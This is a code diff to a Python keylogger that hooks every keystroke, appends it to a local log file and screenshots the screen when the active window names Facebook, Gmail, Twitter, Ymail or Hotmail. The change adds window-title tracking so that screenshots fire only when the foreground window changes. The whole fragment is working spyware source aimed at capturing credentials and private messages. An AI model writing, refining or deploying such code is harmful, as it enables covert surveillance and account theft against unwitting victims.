@@ -27,15 +27,21 @@ running = False
 store = ''
 listOfWindows = ['Facebook', 'Gmail', 'Twitter', 'Hotmail', 'Ymail', 'Yandex']
 obj = pyHook.HookManager()
+lastWindowText = ''
+windowText = ''
 
 
 def keypressed(event):
+    global windowText
+    global lastWindowText
     # Take a screenshot if any of the mentioned website is in the front screen
     w = win32gui
     windowText = w.GetWindowText(w.GetForegroundWindow())
-    if 'Facebook' in windowText or 'Gmail' in windowText or 'Twitter' in windowText \
-            or 'Ymail' in windowText or 'Hotmail' in windowText:
-        screenshot()
+    if lastWindowText != windowText:    # So that no useless screenshots
+        if 'Facebook' in windowText or 'Gmail' in windowText or 'Twitter' in windowText \
+                or 'Ymail' in windowText or 'Hotmail' in windowText:
+            screenshot()
+
     global store
     print chr(event.Ascii)         # Print key info
 
@@ -50,6 +56,7 @@ def keypressed(event):
     fp = open('keylogs.txt', 'a+')
     fp.write(store)
     fp.close()
+    lastWindowText = windowText
     return True
 
 
